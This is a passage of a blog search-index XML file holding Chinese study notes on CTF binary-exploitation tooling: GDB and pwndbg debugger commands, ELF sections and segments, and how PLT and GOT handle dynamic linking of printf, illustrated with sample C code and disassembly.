<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文档学习</title>
      <link href="/2024/10/28/%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/28/%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN工具"><a href="#PWN工具" class="headerlink" title="PWN工具"></a>PWN工具</h1><h2 id="pwn工具"><a href="#pwn工具" class="headerlink" title="pwn工具"></a>pwn工具</h2><p> <img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161025300.png" alt="image-20241016102519205"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161113384.png" alt="image-20241016111303358"></p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><blockquote><p>调试可执行文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用gcc编译test.c文件，结果文件命名为test.out，并且加入debugger信息</span></span><br><span class="line">gcc -g ./test.c -o test.out </span><br><span class="line"></span><br><span class="line">gdb ./test.out</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">断点</span></span><br><span class="line">b main</span><br><span class="line">b path:line</span><br><span class="line">d num # 删除num号断点</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行</span></span><br><span class="line">r</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不进函数单步 next</span></span><br><span class="line">n</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进函数单步</span></span><br><span class="line">f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结束</span></span><br><span class="line">k</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">继续到下一个断点</span></span><br><span class="line">c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监视变量</span></span><br><span class="line">watch i # 直到变量i变化</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">信息查看</span></span><br><span class="line">info b # 查看断点</span><br><span class="line">info r # 查看寄存器</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看变量</span></span><br><span class="line">p i</span><br><span class="line">p/x #  16进制打印</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">layout，展示</span></span><br><span class="line">layout src # 展示源码</span><br><span class="line">ctrl x + a #关闭/打开</span><br><span class="line"></span><br><span class="line">layout asm # 查看汇编，si来单步跳转</span><br></pre></td></tr></table></figure><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><h3 id="什么是pwndbg"><a href="#什么是pwndbg" class="headerlink" title="什么是pwndbg?"></a>什么是pwndbg?</h3><p>它是<code>gdb</code>的一个插件，增加了许多功能，来帮助pwn手可以快速寻找到所需要的信息，除了<code>pwndbg</code>之外还有<code>peda</code>、<code>gef</code>等工具可以用来协助进行调试。</p><h3 id="如何给pwndbg分屏"><a href="#如何给pwndbg分屏" class="headerlink" title="如何给pwndbg分屏?"></a>如何给pwndbg分屏?</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinit</span><br><span class="line">set context-output /dev/pts/2 # 这里修改成2，那么就会在第二个终端显示信息</span><br></pre></td></tr></table></figure><h3 id="pwndbg的基础操作"><a href="#pwndbg的基础操作" class="headerlink" title="pwndbg的基础操作:"></a>pwndbg的基础操作:</h3><p>启动调试:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./文件名</span><br><span class="line">比如:gdb ./pwn</span><br></pre></td></tr></table></figure><p>如果我们已经成功安装了<code>pwndbg</code>，那么打开<code>gdb</code>之后会显示<code>pwndbg&gt;</code><br>这样的提示符号，否则是<code>gdb&gt;</code></p><p>基础操作:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">start</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始运行，会停留在start函数上(start函数是main函数之前的一个函数)</span> </span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">q</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出调试</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从头运行程序直到遇到断点,没有断点则会一直运行到结束</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">继续执行程序直到遇到断点，没有断点则会一直运行到结束</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单步步过，n不会进入一个小函数</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">ni</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用，同n，但是是汇编层面的一步</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">s</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">步入，比如遇到一个call 什么什么函数，s会进入看看怎么个事</span> </span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">si</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用，同s，但是是汇编层面的一步</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">fini</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">快速运行结束当前函数</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">context</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新打印页面信息</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b function_name</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如: b <span class="built_in">read</span> 在<span class="built_in">read</span>函数上下断点，运行到<span class="built_in">read</span>函数的时候就会停止</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *(&amp;function_name+offset)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如: b *(&amp;<span class="built_in">read</span> + 10) 在<span class="built_in">read</span>函数+10的地址上下断点，运行到这个地址的时候就会停止</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *0xaddr</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如: b *0x408010 那么程序运行到0x408010这个地址的时候就会停止</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">i b</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看断点信息，哪些地方打了断点</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">delete &lt;断点序号&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除断点序号对应的断点,单独一个delete会删除所有断点</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">i r</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有寄存器中存储的数据</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">i r &lt;registers&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看具体某一个寄存器的值 比如: pwndbg&gt; i r rax</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack &lt;int&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看栈中的信息，具体数量填在stack后面，比如: stack 50</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">search &lt;string&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在程序中查看字符串，可以查看自己输入的信息被存在什么地方了</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> $&lt;rigister&gt; = &lt;int&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用<span class="built_in">set</span>来给寄存器设置自定义的值</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看我们当前这个函数的上一个函数是什么</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看程序各个段的位置以及权限等信息</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">elf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看elf文件信息</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看释放的堆块</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看正在使用的堆块</span></span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure><h3 id="命令和p命令的使用"><a href="#命令和p命令的使用" class="headerlink" title="命令和p命令的使用:"></a>命令和p命令的使用:</h3><h4 id="1-x-命令"><a href="#1-x-命令" class="headerlink" title="1.x 命令"></a>1.<code>x</code> 命令</h4><p><code>x</code> 命令用于查看内存中的数据。它可以显示指定地址或变量所占内存的内容。其基本语法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/[n][f][u] addr</span><br></pre></td></tr></table></figure><h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><code>n</code>：可选，表示要显示的单元数量，默认为1。</li><li><code>f</code>：可选，表示显示的格式，常见格式包括：<ul><li><code>d</code>：十进制整数</li><li><code>x</code>：十六进制</li><li><code>o</code>：八进制</li><li><code>c</code>：字符</li><li><code>f</code>：浮点数</li></ul></li><li><code>u</code>：可选，表示数据单位，常见单位包括：<ul><li><code>b</code>：字节</li><li><code>h</code>：半字（2 字节）</li><li><code>w</code>：字（4 字节）</li><li><code>g</code>：巨字（8 字节）</li></ul></li></ul><h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><ol><li><h6 id="查看内存地址的内容："><a href="#查看内存地址的内容：" class="headerlink" title="查看内存地址的内容："></a><strong>查看内存地址的内容</strong>：</h6></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10x 0x7fffffffe000</span><br></pre></td></tr></table></figure><p>以上命令将以十六进制格式显示从 <code>0x7fffffffe000</code> 开始的10个字节的内容。</p><ol start="2"><li><h6 id="查看变量的内容："><a href="#查看变量的内容：" class="headerlink" title="查看变量的内容："></a><strong>查看变量的内容</strong>：</h6></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/4d my_array</span><br></pre></td></tr></table></figure><p>该命令将以十进制格式查看 <code>my_array</code> 数组的前4个元素。</p><h4 id="2-p-命令"><a href="#2-p-命令" class="headerlink" title="2. p 命令"></a>2. <code>p</code> 命令</h4><p><code>p</code> 命令用于打印变量的值，通常用于查看变量的当前状态。其基本语法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p [expression]</span><br></pre></td></tr></table></figure><h5 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><code>expression</code>：要打印的变量名或表达式。</li></ul><h5 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h5><ol><li><h6 id="打印简单变量："><a href="#打印简单变量：" class="headerlink" title="打印简单变量："></a><strong>打印简单变量</strong>：</h6></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_variable</span><br></pre></td></tr></table></figure><p>该命令将输出 <code>my_variable</code> 的当前值。</p><ol start="2"><li><h6 id="打印结构体成员："><a href="#打印结构体成员：" class="headerlink" title="打印结构体成员："></a><strong>打印结构体成员</strong>：</h6></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_struct.member</span><br></pre></td></tr></table></figure><p>此命令将输出结构体 <code>my_struct</code> 中 <code>member</code> 的值。</p><ol start="3"><li><h6 id="打印表达式的值："><a href="#打印表达式的值：" class="headerlink" title="打印表达式的值："></a><strong>打印表达式的值</strong>：</h6></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_variable + 10</span><br></pre></td></tr></table></figure><p>该命令将输出 <code>my_variable</code> 的值加上10的结果</p><h4 id="3-常见用法示例"><a href="#3-常见用法示例" class="headerlink" title="3. 常见用法示例"></a>3. 常见用法示例</h4><h5 id="3-1-打印变量地址"><a href="#3-1-打印变量地址" class="headerlink" title="3.1 打印变量地址"></a><strong>3.1 打印变量地址</strong></h5><p>使用 <code>&amp;</code> 操作符可以打印变量的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp;my_variable</span><br></pre></td></tr></table></figure><hr><h5 id="3-2-观察数组"><a href="#3-2-观察数组" class="headerlink" title="3.2 观察数组"></a><strong>3.2 观察数组</strong></h5><p>结合 <code>p</code> 和 <code>x</code> 命令，可以更好地观察数组内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10d my_array p my_array[0]</span><br></pre></td></tr></table></figure><hr><h5 id="3-3-打印指针指向的值"><a href="#3-3-打印指针指向的值" class="headerlink" title="3.3 打印指针指向的值"></a><strong>3.3 打印指针指向的值</strong></h5><p>如果打印指针指向的内容，可以使用 <code>*</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *my_pointer</span><br></pre></td></tr></table></figure><p>在 <code>gdb</code> 中是可以设置地址随机化开关，需要的时候可以关闭，来帮助我们调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> disable-randomization on<span class="comment"># 开</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> disable-randomization off<span class="comment"># 关</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">show disable-randomization<span class="comment"># 查</span></span></span><br></pre></td></tr></table></figure><h1 id="二进制基础"><a href="#二进制基础" class="headerlink" title="二进制基础"></a>二进制基础</h1><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161623657.png" alt="image-20241016102817232"></p><h2 id="硬件知识"><a href="#硬件知识" class="headerlink" title="硬件知识"></a>硬件知识</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161656236.png" alt="image-20241016165612168"></p><h3 id="大端序与小端序"><a href="#大端序与小端序" class="headerlink" title="大端序与小端序"></a>大端序与小端序</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161401991.png" alt="image-20241016140138922"></p><h2 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161654275.png" alt="image-20241016165451184"></p><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161044136.png" alt="image-20241016104436079"></p><blockquote><p>磁盘里的才叫ELF，到了内存中就变成virtual memory进程了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161051944.png" alt="image-20241016105138773"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161054011.png" alt="image-20241016105407919"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161054691.png" alt="image-20241016105423621"></p><h3 id="段（segment）和节（section）"><a href="#段（segment）和节（section）" class="headerlink" title="段（segment）和节（section）"></a>段（segment）和节（section）</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161153825.png" alt="image-20241016115310776"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161156174.png" alt="image-20241016115652120"></p><blockquote><p>不可写的数据放在text段 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161629087.png" alt="image-20241016162918018"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161647461.png" alt="image-20241016164758380"></p><h4 id="节"><a href="#节" class="headerlink" title="节"></a>节</h4><ul><li><code>.bss</code> 节用于存储<strong>未初始化的全局变量和静态变量</strong>。</li><li><code>.text</code> 节存储程序的<strong>可执行指令</strong>，即代码本身。</li><li><code>.data</code> 节用于存储<strong>已初始化的全局变量和静态变量</strong>。</li><li><code>.rodata</code> 节存储<strong>只读数据</strong>，如常量字符串、常量数组等。</li><li><code>.plt</code> 节用于支持动态链接库的函数调用。</li><li><code>.got</code> 节存储了全局变量的地址，主要用于实现动态链接。</li><li><code>.init</code> 节中的代码通常是一些需要在 <code>main</code> 函数之前执行的初始化任务，比如在 C++ 中调用全局构造函数或执行一些启动例程。</li></ul><h4 id="段"><a href="#段" class="headerlink" title="段"></a>段</h4><h3 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h3><p>在介绍PLT和GOT出场之前，先以一个简单的例子引入两个主角，各位请看以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译:</strong></p><blockquote><p>gcc -Wall -g -o test.o -c test.c -m32</p></blockquote><p><strong>链接:</strong></p><blockquote><p>gcc -o test test.o -m32</p></blockquote><p>注意：现代Linux系统都是x86_64系统了，后面需要对中间文件test.o以及可执行文件test反编译，分析汇编指令，因此在这里使用-m32选项生成i386架构指令而非x86_64架构指令。</p><p>经编译和链接阶段之后，test可执行文件中print_banner函数的汇编指令会是怎样的呢？我猜应该与下面的汇编类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">080483cc &lt;print_banner&gt;:</span><br><span class="line"> 80483cc:    push %ebp</span><br><span class="line"> 80483cd:    mov  %esp, %ebp</span><br><span class="line"> 80483cf:    sub  $0x8, %esp</span><br><span class="line"> 80483d2:    sub  $0xc, %esp</span><br><span class="line"> 80483d5:    push $0x80484a8  </span><br><span class="line"> 80483da:    call **&lt;printf函数的地址&gt;**</span><br><span class="line"> 80483df:    add $0x10, %esp</span><br><span class="line"> 80483e2:    nop</span><br><span class="line"> 80483e3:    leave</span><br><span class="line"> 80483e4:    ret</span><br></pre></td></tr></table></figure><p>print_banner函数内调用了printf函数，而printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。故上述的**<code>**&lt;printf函数地址&gt;**</code>** 一项是无法填充的，只有进程运运行后，printf函数的地址才能确定。</p><p>那么问题来了：<strong>进程运行起来之后，glibc动态库也装载了，printf函数地址亦已确定，上述call指令如何修改（重定位）呢？</strong></p><p>一个简单的方法就是将指令中的**<code>**&lt;printf函数地址&gt;**</code>**修改printf函数的真正地址即可。</p><p>但这个方案面临两个问题：</p><blockquote><ul><li>现代操作系统不允许修改代码段，只能修改数据段</li><li>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。</li></ul></blockquote><p><strong>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</strong></p><p>注意：刚才谈到的回写，是指运行时修改，更专业的称谓应该是<strong>运行时重定位</strong>，与之相对应的还有<strong>链接时重定位</strong>。</p><p>说到这里，需要把编译链接过程再展开一下。我们知道，每个编译单元（通常是一个.c文件，比如前面例子中的test.c）都会经历编译和链接两个阶段。</p><p>编译阶段是将.c源代码翻译成汇编指令的中间文件，比如上述的test.c文件，经过编译之后，生成test.o中间文件。print_banner函数的汇编指令如下（使用强调内容<strong>objdump -d test.o</strong>命令即可输出）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;print_banner&gt;:</span><br><span class="line">      0:  55                   push %ebp</span><br><span class="line">      1:  89 e5                mov %esp, %ebp</span><br><span class="line">      3:  83 ec 08             sub   $0x8, %esp</span><br><span class="line">      6:  c7 04 24 00 00 00 00 movl  $0x0, (%esp)</span><br><span class="line">      d:  e8 fc ff ff ff       call  e &lt;print_banner+0xe&gt;</span><br><span class="line">     12:  c9                   leave</span><br><span class="line">     13:  c3                   ret</span><br></pre></td></tr></table></figure><p>是否注意到call指令的操作数是fc ff ff ff，翻译成16进制数是0xfffffffc（x86架构是小端的字节序），看成有符号是-4。这里应该存放printf函数的地址，但由于编译阶段无法知道printf函数的地址，所以预先放一个-4在这里，然后用重定位项来描述：<strong>这个地址在链接时要修正，它的修正值是根据printf地址（更确切的叫法应该是符号，链接器眼中只有符号，没有所谓的函数和变量）来修正，它的修正方式按相对引用方式</strong>。</p><p>这个过程称为<strong>链接时重定位</strong>，与刚才提到的运行时重定位工作原理完全一样，只是修正时机不同。</p><p><strong>链接阶段</strong>是将一个或者多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，链接阶段主要完成以下事情：</p><blockquote><ul><li>各个中间文之间的同名section合并</li><li>对代码段，数据段以及各符号进行地址分配</li><li>链接时重定位修正</li></ul></blockquote><p>除了重定位过程，其它动作是无法修改中间文件中函数体内指令的，而重定位过程也只能是修改指令中的操作数，换句话说，<strong>链接过程无法修改编译过程生成的汇编指令</strong>。</p><p>那么问题来了：<strong>编译阶段怎么知道printf函数是在glibc运行库的，而不是定义在其它.o中</strong></p><p>答案往往令人失望：<strong>编译器是无法知道的</strong></p><p>那么编译器只能老老实实地生成调用printf的汇编指令，printf是在glibc动态库定位，或者是在其它.o定义这两种情况下，它都能工作。如果是在其它.o中定义了printf函数，那在链接阶段，printf地址已经确定，可以直接重定位。如果printf定义在动态库内（链接阶段是可以知道printf在哪定义的，只是如果定义在动态库内不知道它的地址而已），链接阶段无法做重定位。</p><p>根据前面讨论，运行时重定位是无法修改代码段的，只能将printf重定位到数据段。那在编译阶段就已生成好的call指令，怎么感知这个已重定位好的数据段内容呢？</p><p>答案是：<strong>链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用</strong>。</p><p>链接器生成额外的伪代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址：</span><br><span class="line">　　这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure><p>链接阶段发现printf定义在动态库时，链接器生成一段小代码print_stub，然后printf_stub地址取代原来的printf。因此转化为链接阶段对printf_stub做链接重定位，而运行时才对printf做运行时重定位。</p><h4 id="动态链接姐妹花PLT与GOT"><a href="#动态链接姐妹花PLT与GOT" class="headerlink" 